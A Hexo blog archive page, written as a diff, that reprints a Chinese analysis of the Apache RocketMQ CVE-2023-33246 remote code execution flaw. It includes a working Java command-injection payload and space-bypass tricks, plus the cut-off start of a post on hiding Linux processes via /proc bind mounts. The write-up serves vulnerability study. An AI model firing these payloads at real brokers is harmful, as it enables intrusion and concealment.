@@ -1,0 +1,1181 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    
+    <title>Archives: 2023 | 氕氘氚</title>
+    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
+    <meta name="HandheldFriendly" content="True"/>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="google-site-verification" content=""/>
+    <meta name="baidu-site-verification" content=""/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="Open your eyes to see the light in life">
+<meta property="og:type" content="website">
+<meta property="og:title" content="氕氘氚">
+<meta property="og:url" content="http://example.com/archives/2023/page/5/index.html">
+<meta property="og:site_name" content="氕氘氚">
+<meta property="og:description" content="Open your eyes to see the light in life">
+<meta property="og:locale">
+<meta property="article:author" content="Szczecin">
+<meta name="twitter:card" content="summary">
+    
+
+    <!-- Favicon -->
+    
+        <link rel="icon" href="/img/favicon.ico" />
+    
+
+    <!-- Font -->
+    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">
+
+    
+<link rel="stylesheet" href="/style.css">
+
+    <script>
+      function setLoadingBarProgress(num) {
+        document.getElementById('loading-bar').style.width = num + "%";
+      }
+    </script>
+
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+
+<script>setLoadingBarProgress(20)</script>
+
+<div id="site-wrapper">
+
+    <header id="header">
+    <div id="header-wrapper" class="clearfix">
+        <a id="logo" href="/">
+            <img src="/img/logo.png"/>
+            <span id="site-desc">
+                Be A Gorgeous World
+            </span>
+        </a>
+        <button id="site-nav-switch">
+            <span class="icon icon-menu"></span>
+        </button>
+    </div>
+</header>
+    <script>setLoadingBarProgress(40);</script>
+
+    <main id="main" role="main">
+        
+    
+
+
+  <section class="page-header archive">
+    <h1>- <span>2023</span> -</h1>
+  </section>
+
+
+
+
+<section class="post-list">
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/">
+                Apache RocketMQ 远程代码执行漏洞（CVE-2023-33246）漏洞分析
+            </a>
+        </h2>
+    
+    <time>
+        Sep 2, 2023
+    </time>
+    <section class="content">
+        <h1><span id="apache-rocketmq-远程代码执行漏洞cve-2023-33246漏洞分析">Apache RocketMQ 远程代码执行漏洞（CVE-2023-33246）漏洞分析</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://paper.seebug.org/2081/">Sunflower@知道创宇404实验室</a> 并作补充</p>
+</blockquote>
+<h2><span id="1漏洞介绍">1.漏洞介绍</span></h2><blockquote>
+<p>Apache RocketMQ 存在远程命令执行漏洞(CVE-2023-33246)。RocketMQ的NameServer、Broker、Controller等多个组件暴露在外网且缺乏权限验证，攻击者可以利用该漏洞利用更新配置功能以RocketMQ运行的系统用户身份执行命令。</p>
+</blockquote>
+<h2><span id="2漏洞版本">2.漏洞版本</span></h2><blockquote>
+<p>5.0.0 &lt;&#x3D; Apache RocketMQ &lt; 5.1.1</p>
+<p>4.0.0 &lt;&#x3D; Apache RocketMQ &lt; 4.9.6</p>
+</blockquote>
+<h2><span id="3环境搭建">3.环境搭建</span></h2><blockquote>
+<p>使用docker拉取漏洞环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull apache/rocketmq:4.9.5</span><br></pre></td></tr></table></figure>
+
+<p>运行docker run命令，搭建docker环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name rmqnamesrv -p 9876:9876 apache/rocketmq:4.9.5 sh mqnamesrv</span><br><span class="line">docker run -d --name rmqbroker --<span class="built_in">link</span> rmqnamesrv:namesrv -e <span class="string">&quot;NAMESRV_ADDR=namesrv:9876&quot;</span> -p 10909:10909 -p 10911:10911 -p 10912:10912 apache/rocketmq:4.9.5 sh mqbroker -c /home/rocketmq/rocketmq-4.9.5/conf/broker.conf</span><br></pre></td></tr></table></figure>
+
+<p>docker ps检查docker正常启动即可</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="4rocketmq简介">4.RocketMQ简介</span></h2><blockquote>
+<p>我们平时使用一些体育新闻软件，会订阅自己喜欢的一些球队板块，当有作者发表文章到相关的板块，我们就能收到相关的新闻推送。</p>
+<p>发布-订阅（Pub&#x2F;Sub）是一种消息范式，消息的发送者（称为发布者、生产者、Producer）会将消息直接发送给特定的接收者（称为订阅者、消费者、Comsumer）。而RocketMQ的基础消息模型就是一个简单的Pub&#x2F;Sub模型[1]。</p>
+</blockquote>
+<h3><span id="41-rocketmq的部署模型">4.1 RocketMQ的部署模型</span></h3><blockquote>
+<p>Producer、Consumer又是如何找到Topic和Broker的地址呢？消息的具体发送和接收又是怎么进行的呢？</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/2.png" alt="image"></p>
+</blockquote>
+<h3><span id="42-名字服务器-nameserver">4.2 名字服务器 NameServer</span></h3><blockquote>
+<p>NameServer是一个简单的 Topic 路由注册中心，支持 Topic、Broker 的动态注册与发现。</p>
+<p>主要包括两个功能：<br>Broker管理，NameServer接受Broker集群的注册信息并且保存下来作为路由信息的基本数据。然后提供心跳检测机制，检查Broker是否还存活；<br>路由信息管理，每个NameServer将保存关于 Broker 集群的整个路由信息和用于客户端查询的队列信息。Producer和Consumer通过NameServer就可以知道整个Broker集群的路由信息，从而进行消息的投递和消费。</p>
+</blockquote>
+<h3><span id="43-代理服务器-broker">4.3 代理服务器 Broker</span></h3><blockquote>
+<p>Broker主要负责消息的存储、投递和查询以及服务高可用保证。</p>
+<p>NameServer几乎无状态节点，因此可集群部署，节点之间无任何信息同步。Broker部署相对复杂。</p>
+<p>在 Master-Slave 架构中，Broker 分为 Master 与 Slave。一个Master可以对应多个Slave，但是一个Slave只能对应一个Master。Master 与 Slave 的对应关系通过指定相同的BrokerName，不同的BrokerId 来定义，BrokerId为0表示Master，非0表示Slave。Master也可以部署多个。</p>
+</blockquote>
+<h3><span id="44-消息收发">4.4 消息收发</span></h3><blockquote>
+<p>在进行消息收发之前，我们需要告诉客户端NameServer的地址，RocketMQ有多种方式在客户端中设置NameServer地址，举例三个，优先级由高到低，高优先级会覆盖低优先级。</p>
+<p>代码中指定Name Server地址，多个namesrv地址之间用分号分割</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">producer.setNamesrvAddr(<span class="string">&quot;192.168.0.1:9876;192.168.0.2:9876&quot;</span>);  </span><br><span class="line">consumer.setNamesrvAddr(<span class="string">&quot;192.168.0.1:9876;192.168.0.2:9876&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Java启动参数中指定Name Server地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Drocketmq.namesrv.addr=192.168.0.1:9876;192.168.0.2:9876  </span><br></pre></td></tr></table></figure>
+
+<p>环境变量指定Name Server地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> NAMESRV_ADDR=192.168.0.1:9876;192.168.0.2:9876</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="45-漏洞主要涉及的类的介绍">4.5 漏洞主要涉及的类的介绍</span></h3><h4><span id="451-defaultmqadminext">4.5.1 DefaultMQAdminExt</span></h4><blockquote>
+<p>DefaultMQAdminExt是 RocketMQ 提供的一个扩展类。它提供了一些管理和操作 RocketMQ 的工具方法，可以用于管理主题（Topic）、消费者组（Consumer Group）、订阅关系等。</p>
+<p>DefaultMQAdminExt类提供了一些常用的方法，包括创建和删除主题、查询主题信息、查询消费者组信息、更新订阅关系等。它可以通过与 NameServer 交互来获取和修改相关配置信息，并提供了对 RocketMQ 的管理功能。</p>
+<p>例如DefaultMQAdminExt更新broker配置的一个方法（更新的配置文件为broker.conf）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateBrokerConfig</span><span class="params">(String brokerAddr,</span></span><br><span class="line"><span class="params">    Properties properties)</span> <span class="keyword">throws</span> RemotingConnectException, RemotingSendRequestException,</span><br><span class="line">    RemotingTimeoutException, UnsupportedEncodingException, InterruptedException, MQBrokerException &#123;</span><br><span class="line">    defaultMQAdminExtImpl.updateBrokerConfig(brokerAddr, properties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4><span id="452-filterservermanager">4.5.2 FilterServerManager</span></h4><blockquote>
+<p>在 Apache RocketMQ 中，FilterServerManager 类是用于管理过滤服务器（Filter Server）的类。过滤服务器是 RocketMQ 中的一种组件，用于支持消息过滤功能。过滤服务器负责处理消息过滤规则的注册、更新和删除，以及消息过滤的评估和匹配。</p>
+</blockquote>
+<h2><span id="5漏洞分析">5.漏洞分析</span></h2><blockquote>
+<p>补丁文件[2]中直接将Filter Server模块全部移除，所以我们可以直接来看FilterServerManager，简要分析一下FilterServerManager的调用流程：</p>
+<p>在Broker启动时执行sh mqbroker…，调用到BrokerStartup类：</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/3.png" alt="image"></p>
+<p>在该类中继续调用到BrokerController中的start()方法</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/4.png" alt="image"></p>
+<p>继续跟进</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/5.png" alt="image"></p>
+<p>最终到了FilterServerManager类中，其中FilterServerUtil.callShell();存在命令执行:</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.scheduledExecutorService.scheduleAtFixedRate(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                FilterServerManager.<span class="built_in">this</span>.createFilterServer();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span> * <span class="number">5</span>, <span class="number">1000</span> * <span class="number">30</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createFilterServer</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">more</span> <span class="operator">=</span></span><br><span class="line">        <span class="built_in">this</span>.brokerController.getBrokerConfig().getFilterServerNums() - <span class="built_in">this</span>.filterServerTable.size();</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="built_in">this</span>.buildStartCommand();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; more; i++) &#123;</span><br><span class="line">        FilterServerUtil.callShell(cmd, log);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">buildStartCommand</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">config</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (BrokerStartup.configFile != <span class="literal">null</span>) &#123;</span><br><span class="line">        config = String.format(<span class="string">&quot;-c %s&quot;</span>, BrokerStartup.configFile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.brokerController.getBrokerConfig().getNamesrvAddr() != <span class="literal">null</span>) &#123;</span><br><span class="line">        config += String.format(<span class="string">&quot; -n %s&quot;</span>, <span class="built_in">this</span>.brokerController.getBrokerConfig().getNamesrvAddr());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (RemotingUtil.isWindowsPlatform()) &#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;start /b %s\\bin\\mqfiltersrv.exe %s&quot;</span>,</span><br><span class="line">            <span class="built_in">this</span>.brokerController.getBrokerConfig().getRocketmqHome(),</span><br><span class="line">            config);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;sh %s/bin/startfsrv.sh %s&quot;</span>,</span><br><span class="line">            <span class="built_in">this</span>.brokerController.getBrokerConfig().getRocketmqHome(),</span><br><span class="line">            config);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>根据start()方法内部可知createFilterServer方法每隔30秒都会被调用一次，</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.scheduledExecutorService.scheduleAtFixedRate(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                FilterServerManager.<span class="built_in">this</span>.createFilterServer();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span> * <span class="number">5</span>, <span class="number">1000</span> * <span class="number">30</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>到了这一步，很明显我们只需要控制BrokerConfig进行命令拼接，等待触发createFilterServer即可造成RCE。</p>
+<p>但是要想成功触发命令执行还有两个问题需要解决一下：</p>
+<p>1、在createFilterServer方法中，more的值要大于0才会触发callShell方法</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createFilterServer</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">more</span> <span class="operator">=</span></span><br><span class="line">        <span class="built_in">this</span>.brokerController.getBrokerConfig().getFilterServerNums() - <span class="built_in">this</span>.filterServerTable.size();</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="built_in">this</span>.buildStartCommand();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; more; i++) &#123;</span><br><span class="line">        FilterServerUtil.callShell(cmd, log);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里只需要通过DefaultMQAdminExt设置filterServerNums的值即可，大致为：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">properties.setProperty(<span class="string">&quot;filterServerNums&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">...</span><br><span class="line"><span class="type">DefaultMQAdminExt</span> <span class="variable">defaultMQAdminExt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQAdminExt</span>();</span><br><span class="line">...</span><br><span class="line">defaultMQAdminExt.updateBrokerConfig(<span class="string">&quot;192.168.87.128:10911&quot;</span>, props);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>2、callshell方法传入命令时，shellString会被splitShellString方法使用空格进行拆分为一个cmdArray数组。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">callShell</span><span class="params">(<span class="keyword">final</span> String shellString, <span class="keyword">final</span> InternalLogger log)</span> &#123;</span><br><span class="line">    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String[] cmdArray = splitShellString(shellString);</span><br><span class="line">        process = Runtime.getRuntime().exec(cmdArray);</span><br><span class="line">        process.waitFor();</span><br><span class="line">        log.info(<span class="string">&quot;CallShell: &lt;&#123;&#125;&gt; OK&quot;</span>, shellString);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;CallShell: readLine IOException, &#123;&#125;&quot;</span>, shellString, e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> != process)</span><br><span class="line">            process.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>意味着传入的命令如果带了空格，都会被拆分为数组，而数组在exec中会将每个命令的结尾标记为下一个命令的开头[3]。</p>
+<p><code>sh &#123;可控&#125;/bin/startfsrv.sh ...</code> 如果传入 <code>-c curl 127.0.0.1;</code></p>
+<p>那么comArray为 <code>[&#39;sh&#39; &#39;-c&#39; &#39;curl&#39; &#39;127.0.0.1&#39; &#39;;&#39; &#39;/bin/startfsrv.sh&#39; &#39;...&#39;]</code></p>
+<p>这里的每个命令的结尾作为下一个命令的开头，它将每个被传入的命令都看作为一个整体，想不出一个更合适的例子，这里可以使用shell里的单引号括起来进行辅助理解：</p>
+<p><code>&#39;sh&#39; &#39;-c&#39; &#39;curl&#39; &#39;127.0.0.1&#39; &#39;;&#39; &#39;/bin/startfsrv.sh&#39; &#39;...&#39;</code></p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/6.png" alt="image"></p>
+<p>很明显，这里的curl因为使用了空格，导致curl 127.0.0.1被拆分为了两个部分，正确的写法应该是：</p>
+<p><code>&#39;sh&#39; &#39;-c&#39; &#39;curl 127.0.0.1&#39; &#39;;&#39; &#39;/bin/startfsrv.sh&#39; &#39;...&#39;</code></p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/7.png" alt="image"></p>
+<p>但是使用空格又会被split，所以现在的问题点就在于如何避免使用空格进行完整的传参，网上公开的解法[4]：</p>
+<p><code>-c $@|sh . echo curl 127.0.0.1;</code></p>
+<p><code>$@</code> 作为一个特殊变量，它表示传递给脚本或命令的所有参数，直接将echo后面的值作为一个整体传递给$@，解决了拆分命令的问题。</p>
+<p>感谢longofo@知道创宇404实验室带我探讨出第二个绕过方法：</p>
+<p>顺便一提，这个绕过的核心点在于这里如果不使用bash，则无法成功使用${IFS}以及{}进行绕过空格限制，这里就不再进行细节讲解，感兴趣的师傅可以动手试试：</p>
+<p><code>-c bash$&#123;IFS&#125;-c$&#123;IFS&#125;\&quot;&#123;echo,dG91Y2ggL3RtcC9kZGRkZGRkYWE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;;</code></p>
+</blockquote>
+<h3><span id="51-payload构造">5.1 payload构造</span></h3><blockquote>
+<p>根据上面的知识，最终构造的payload为：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">properties.setProperty(<span class="string">&quot;filterServerNums&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">properties.setProperty(<span class="string">&quot;rocketmqHome&quot;</span>,<span class="string">&quot;-c bash$&#123;IFS&#125;-c$&#123;IFS&#125;\&quot;&#123;echo,dG91Y2ggL3RtcC9kZGRkZGRkYWE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;;&quot;</span>);</span><br><span class="line"><span class="type">DefaultMQAdminExt</span> <span class="variable">defaultMQAdminExt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQAdminExt</span>();</span><br><span class="line">defaultMQAdminExt.setNamesrvAddr(<span class="string">&quot;localhost:9876&quot;</span>);</span><br><span class="line">defaultMQAdminExt.start();</span><br><span class="line">defaultMQAdminExt.updateBrokerConfig(<span class="string">&quot;192.168.87.128:10911&quot;</span>, properties);</span><br><span class="line">defaultMQAdminExt.shutdown();</span><br></pre></td></tr></table></figure>
+
+<h3><span id="52-漏洞验证">5.2 漏洞验证</span></h3><blockquote>
+<p>使用payload进行curl dnslog，每隔30s左右收到一次请求：</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/8.png" alt="image"></p>
+</blockquote>
+<h3><span id="53-漏洞修复">5.3 漏洞修复</span></h3><blockquote>
+<p>在修复版本4.9.6和5.1.1中都是直接删除了filter server模块</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/9.png" alt="image"></p>
+</blockquote>
+<h3><span id="54-影响范围统计">5.4 影响范围统计</span></h3><blockquote>
+<p>使用Zoomeye[5]进行搜索，得到ip结果34348条：<br><a target="_blank" rel="noopener" href="https://www.zoomeye.org/searchResult?q=service:%22RocketMQ%22">https://www.zoomeye.org/searchResult?q=service%3A%22RocketMQ%22</a><br><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/10.png" alt="image"></p>
+<p>使用Zoomeye搜索一下被攻击过的目标数量，得到ip结果6011条：<br><a target="_blank" rel="noopener" href="https://www.zoomeye.org/searchResult?q=service:%22RocketMQ%22+%22rocketmqHome=-c%20$@%7Csh%22">https://www.zoomeye.org/searchResult?q=service%3A%22RocketMQ%22%2B%22rocketmqHome%3D-c%20%24%40%7Csh%22</a><br><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/11.png" alt="image"></p>
+<p>通过Zoomeye的下载功能，再来本地统计一下攻击手法。这里大部分都是通过wget、curl等指令下载木马进行执行反弹shell。</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/12.png" alt="image"></p>
+</blockquote>
+<h2><span id="6参考链接">6.参考链接</span></h2><blockquote>
+<p>[1] <a target="_blank" rel="noopener" href="https://github.com/apache/rocketmq/tree/rocketmq-all-4.5.1/docs/cn">https://github.com/apache/rocketmq/tree/rocketmq-all-4.5.1/docs/cn</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://github.com/apache/rocketmq/commit/c469a60dcca616b077caf2867b64582795ff8bfc">https://github.com/apache/rocketmq/commit/c469a60dcca616b077caf2867b64582795ff8bfc</a></p>
+<p>[3] <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/48011611/what-exactly-can-we-store-inside-of-string-array-in-process-exec">https://stackoverflow.com/questions/48011611/what-exactly-can-we-store-inside-of-string-array-in-process-exec</a></p>
+<p>[4] <a target="_blank" rel="noopener" href="https://github.com/I5N0rth/CVE-2023-33246">https://github.com/I5N0rth/CVE-2023-33246</a></p>
+<p>[5] <a target="_blank" rel="noopener" href="https://www.zoomeye.org/">https://www.zoomeye.org</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/02/Process-Hide/">
+                Linux当中如何隐藏和查看进程
+            </a>
+        </h2>
+    
+    <time>
+        Sep 2, 2023
+    </time>
+    <section class="content">
+        <h1><span id="linux当中如何隐藏和查看进程">Linux当中如何隐藏和查看进程</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/zfw_666666/article/details/126658093">CN-FuWei</a> 并作补充</p>
+</blockquote>
+<h2><span id="前言">前言</span></h2><blockquote>
+<p>进程是执行程序的过程，类似于按照图纸，真正去盖房子的过程。</p>
+<p>同一个程序可以执行多次，每次都可以在内存中开辟独立的空间来装载，从而产生多个进程。不同的进程还可以拥有各自独立的IO接口。操作系统的一个重要功能就是为进程提供方便，比如说为进程分配内存空间，管理进程的相关信息等等，就好像是为我们准备好了一个精美的地址。</p>
+<p>进程信息是proc目录下动态生成，每个动态创建的进程ID号下面详细的记录了关于该进程的fd,mem,io,cpuset等进程信息。</p>
+<p>Linux 内核提供了一种通过 &#x2F;proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。</p>
+<p><strong>通过它可以访问系统内核数据。</strong>用户和应用程序可以通过proc得到系统的信息，并可以改变内核的某些参数。</p>
+<p>由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取proc文件时，proc文件系统动态的。在&#x2F;proc下还有三个很重要的目录：net，scsi和sys。sys目录是可写的，可以通过它来访问或修改内核的参数，而net和scsi则依赖于内核配置。例如，如果系统不支持scsi，则scsi 目录不存在。</p>
+<p>除了以上介绍的这些，还有的是一些以数字命名的目录，它们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在&#x2F;proc下，以进程的 PID号为目录名，它们是读取进程信息的接口。而self目录则是读取进程本身的信息接口。</p>
+<p>读取&#x2F;proc&#x2F;self&#x2F;maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。</p>
+</blockquote>
+<h2><span id="一-隐藏进程">一、隐藏进程</span></h2><blockquote>
+<p>利用mount —bind 将另外一个目录挂载覆盖至&#x2F;proc&#x2F;目录下指定进程ID的目录，我们知道ps、top等工具会读取&#x2F;proc目录下获取进程信息，如果将进程ID的目录信息覆盖，则原来的进程信息将从ps的输出结果中隐匿。</p>
+<p>比如当前有一个minio进程（pid：1945）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@docker]-[~]-ps -ef|grep minio</span><br><span class="line">root       1945   1924  0 08:06 ?        00:00:10 minio server /data --console-address 0.0.0.0:9999</span><br></pre></td></tr></table></figure>
+
+<p>现在我们将该进程隐藏：</p>
